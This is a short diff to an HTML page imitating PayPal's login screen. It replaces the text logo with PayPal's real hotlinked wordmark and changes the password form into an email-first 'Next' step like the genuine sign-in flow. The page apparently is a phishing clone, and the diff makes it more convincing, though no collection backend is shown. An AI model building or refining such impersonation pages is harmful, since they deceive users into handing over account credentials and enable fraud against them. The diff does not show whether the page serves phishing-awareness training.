@@ -45,6 +45,7 @@
         .forgot a {
             color: #0070ba;
             text-decoration: none;
+            font-weight: bold;
         }
         .login-btn {
             width: 100%;
@@ -106,13 +107,14 @@
 </head>
 <body>
     <div class="container">
-        <div class="logo">PayPal</div>
+        <div class="logo">
+            <img src="https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-wordmark-color.svg" width="30%" alt="owo what's this">
+        </div>
        
         <form method="POST">
             <input type="text" name="email" placeholder="Email address or mobile number" required>
-            <input type="password" name="password" placeholder="Password" required>
-            <div class="forgot"><a href="#">Forgotten password?</a></div>
-            <button type="submit" class="login-btn">Log In</button>
+            <div class="forgot"><a href="#">Forgotten your email address?</a></div>
+            <button type="submit" class="login-btn">Next</button>
         </form>
         <div class="divider">or</div>
         <button class="signup-btn">Sign Up</button>
